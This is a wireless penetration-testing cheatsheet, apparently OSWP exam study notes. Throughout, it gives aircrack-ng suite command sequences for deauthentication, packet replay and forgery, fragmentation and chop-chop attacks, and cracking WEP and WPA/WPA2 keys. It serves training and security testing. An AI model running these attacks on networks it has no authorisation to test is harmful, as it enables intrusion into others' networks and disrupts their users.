# Wifu Security cheatsheet 
// (Copyrights from Liodeus Security Cheatsheet. Support him : https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html )

To start the card, 
```
ifconfig wlan0 up
```

## WEP 

```
#### Start monitor mode
airmon-ng start <INTERFACE>

#### Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

#### Get your MAC address
macchanger --show <INTERFACE>

#### Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

#### ARP replay attack
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

#### Crack 
aircrack-ng <CAPTURE_NAME>
```

## Cracking WEP via a Client
```
#### Start monitor mode
airmon-ng start <INTERFACE>

#### Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

#### Get your MAC address
macchanger --show <INTERFACE>

#### Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Interactive packet replay attack
aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>

or

#### Interactive packet replay attack with a capture file
aireplay-ng -2 -r replay_src-<FILE_NAME>.cap <INTERFACE>

#### Crack 
aircrack-ng <CAPTURE_NAME>
```

## Cracking Clientless WEP Networks

### Fragmentation Attack
```
#### Start monitor mode
airmon-ng start <INTERFACE>

#### Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

#### Get your MAC address
macchanger --show <INTERFACE>

#### Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Fragmentation attack
aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Forging ARP packet with the xor packet from fragmentation attack
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <FRAGMENT_PACKET>.xor -w <ARP_PACKET_NAME>

#### Interactive packet replay attack with the forge ARP packet
aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

#### Crack 
aircrack-ng <CAPTURE_NAME>
```

### Chop Chop Attack
```
#### Start monitor mode
airmon-ng start <INTERFACE>

#### Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

#### Get your MAC address
macchanger --show <INTERFACE>

#### Fake authentication attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Chop chop attack
aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Forging ARP packet with the xor packet from chop chop attack 
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y <CHOP_CHOP_PACKET>.xor -w <ARP_PACKET_NAME>

#### Interactive packet replay attack with the forge ARP packet
aireplay-ng -2 -r <ARP_PACKET_NAME> <INTERFACE>

#### Crack 
aircrack-ng <CAPTURE_NAME>
```

## Bypassing WEP Shared Key Authentication
```
#### Start monitor mode
airmon-ng start <INTERFACE>

#### Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

#### Get your MAC address
macchanger --show <INTERFACE>

#### Fake authentication attack (It should failed)
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Deauthentication attack (If there is a client)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

#### Fake shared key authentication using the XOR keystream
aireplay-ng -1 60 -e <ESSID> -y wepshared-<NAME>.xor -a <BSSID> -h <YOUR_MAC> <INTERFACE>

#### ARP replay attack
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

#### Deauthentication attack (If there is a client)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

#### Crack 
aircrack-ng <CAPTURE_NAME>
```

## Cracking WPA/WPA2 PSK
```
#### Start monitor mode
airmon-ng start <INTERFACE>

#### Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

#### Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

#### Crack 
aircrack-ng <CAPTURE_NAME> -w <PASSWORDS_WORDLIST>
```
